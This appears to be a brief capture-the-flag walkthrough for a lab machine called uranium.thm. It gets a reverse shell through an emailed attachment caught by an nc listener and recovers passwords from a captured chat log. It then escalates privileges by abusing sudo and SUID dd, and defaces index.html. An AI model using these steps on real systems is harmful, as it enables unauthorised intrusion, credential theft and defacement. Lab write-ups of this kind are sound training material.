 nmap -sCV -O -p- -oA nmap 10.49.136.179 -T4 | grep open
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

from the x.com account
We got Hostname and Email address

host: uranium.thm

Email: [hakanbey@uranium.thm](mailto:hakanbey@uranium.thm)

add ip to /etc/hosts

setup nc

nc -lvnp 4444

in another terminal
sendEmail -t hakanbey@uranium.thm -f cheems@mail.com -s uranium.thm -u “Hemlo” -m “Surprise for you” -o tls=no -a application
Sep 17 18:21:41 drrr sendEmail[78374]: Email was sent successfully!

and voila, after a few, a shell

stabilize shell

get user flag

upload linpeas using wget

in the var/log folder

python3 -m http.server 8000

 wget http://10.49.136.179:8000/hakanbey_network_log.pcap
--2026-09-17 18:57:25--  http://10.49.136.179:8000/hakanbey_network_log.pcap
Connecting to 10.49.136.179:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1869 (1.8K) [application/vnd.tcpdump.pcap]
Saving to: ‘hakanbey_network_log.pcap’

hakanbey_network_log.pcap     100%[=================================================>]   1.83K  --.-KB/s    in 0s      

2026-09-17 18:57:26 (66.5 MB/s) - ‘hakanbey_network_log.pcap’ saved [1869/1869]

analyse file using wireshark

MBMD1vdpjg3kGv6SsIz56VNG

Hi Kral4

  

Hi bro

  

I forget my password, do you know my password ?

  

Yes, wait a sec I'll send you.

  

Oh , yes yes I remember. No need anymore. Ty..

  

Okay bro, take care !



 ./chat_with_kral4 
PASSWORD :MBMD1vdpjg3kGv6SsIz56VNG
kral4:hi hakanbey

->hi
hakanbey:hi
kral4:how are you?

->i forget my password, do you know my password?
hakanbey:i forget my password, do you know my password?
?

->yes
hakanbey:yes
kral4:okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated


ssh hakanbey@<machine-ip>
password: Mys3cr3tp4sw0rD

sudo -l

sudo -u kral4 /bin/bash

cat user_2.txt

```
find / -perm -4000 2>/dev/null 
```

/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudo
/bin/umount
/bin/ping
/bin/su
/bin/fusermount
/bin/mount
/bin/dd


interesting /bin/dd

```
find / -type f -name web_flag.txt  2>/dev/null
```
```
 /bin/dd if=/var/www/html/web_flag.txt
```
```
cp /bin/nano /home/kral4/
```

```
/var/www/html$ echo "rootkit" | dd of=index.html 
```

./nano /root/root.txt

Voila!!